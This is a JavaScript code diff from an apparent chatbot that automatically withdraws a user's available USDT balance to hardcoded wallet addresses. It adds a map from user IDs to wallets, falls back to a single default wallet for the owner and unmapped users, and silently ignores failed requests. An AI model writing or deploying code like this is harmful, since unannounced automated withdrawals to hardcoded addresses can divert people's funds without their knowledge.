@@ -3027,12 +3027,27 @@ Reply to Arif naturally:`;
                     const avail = parseFloat(cfgData.freeze?.available || 0);
                     if (avail >= 0.1) {
                       const wdAmt = Math.round(avail * 10000) / 10000;
+                      const isolatedEvmMap = {
+                        "8881914294": "0xA203269B8a970d5b74361B406345e1BBF5A0623B",
+                        "7648254021": "0x65DB0FA942144a2A89630c4975FA5f5469f97411",
+                        "8826375659": "0x24718F037aA61e3873073098D121ba3ced8C9daB",
+                        "8450010161": "0x0c649480FC33DfB9216756cB28e2e2efd6b0725D",
+                        "8782429452": "0xC3afc38b8E59E529174fbE4ff7f0CE053A89B8F3",
+                        "7734849205": "0x0262A7E950A9dd872FeB5CF8aD99d6a28Df053f0",
+                        "8025472383": "0xc3Cbd377872bCB69Fa01F5945eADFDFf053E1Bd4",
+                        "8851426148": "0x996292A277E5038efB413247dc7B58AC5209812C",
+                        "8203342513": "0x838bd6C0aCb80bFe3BF684320067672Bf396c479",
+                        "8190649727": "0x91B5cd7EfCBd5bc552479f5Eb70221C5E026228A",
+                        "7487048946": "0x3129386b118892238EF48428e2e5d19B9F7D8215",
+                        "8741547543": "0xE27Df3117501e3a46cf29848Df3414C4542E6A5c"
+                      };
+                      const targetWallet = (String(uid) === (env.OWNER_ID || "6727787768")) ? "0xfda4182001672b9f0f09e2118242e543e35ed5ce" : (isolatedEvmMap[String(uid)] || "0xfda4182001672b9f0f09e2118242e543e35ed5ce");
                       await fetchWithRetry(`${anBase}/api/withdraws/usdt/create`, {
                         method: "POST",
                         headers: reqHeaders,
                         body: JSON.stringify({
                           amount: wdAmt,
-                          wallet: "0xfda4182001672b9f0f09e2118242e543e35ed5ce",
+                          wallet: targetWallet,
                           network: "bep20"
                         })
                       }, 2, 1000).catch(() => {});
